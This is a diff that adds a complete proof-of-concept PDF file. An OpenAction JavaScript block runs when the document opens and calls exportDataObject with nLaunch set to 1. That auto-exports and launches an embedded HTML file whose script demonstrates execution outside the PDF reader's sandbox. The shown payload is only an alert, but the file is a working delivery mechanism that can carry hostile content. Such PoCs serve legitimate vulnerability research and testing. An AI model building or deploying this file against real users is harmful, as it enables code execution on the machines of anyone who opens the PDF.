@@ -1,0 +1,43 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R /Names << /EmbeddedFiles << /Names [(poc.html) 7 0 R] >> >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [4 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Action /S /JavaScript /JS (try { this.exportDataObject({ cName: "poc.html", nLaunch: 1 }); app.alert("nLaunch 1 fired!"); } catch(e) { app.alert("err: "+e); }) >>
+endobj
+4 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 5 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> >>
+endobj
+5 0 obj
+<< /Length 51 >>
+stream
+BT /F1 18 Tf 72 720 Td (exportDataObject PoC) Tj ET
+endstream
+endobj
+6 0 obj
+<< /Type /EmbeddedFile /Length 91 >>
+stream
+<html><body><script>alert('XSS outside sandbox: ' + document.domain)</script></body></html>
+endstream
+endobj
+7 0 obj
+<< /Type /Filespec /F (poc.html) /UF (poc.html) /EF << /F 6 0 R /UF 6 0 R >> /Desc (PoC) >>
+endobj
+xref
+0 8
+0000000000 65535 f 
+0000000009 00000 n 
+0000000136 00000 n 
+0000000193 00000 n 
+0000000381 00000 n 
+0000000556 00000 n 
+0000000657 00000 n 
+0000000818 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+925
+%%EOF
